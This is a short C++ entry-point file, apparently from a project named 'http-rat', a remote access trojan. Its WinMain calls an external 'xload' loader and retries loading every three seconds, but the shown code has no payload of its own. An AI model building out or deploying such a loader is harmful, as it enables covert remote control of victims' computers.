// http-rat.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>

#include <windows.h>

#include "xload.hpp"

int WINAPI WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd)
{
	//
	if (!xload::instance()->fuck())
	{
		return EXIT_FAILURE;
	}

	do {
		Sleep(3000);
	} while (!xload::instance()->load());

	return EXIT_SUCCESS;
}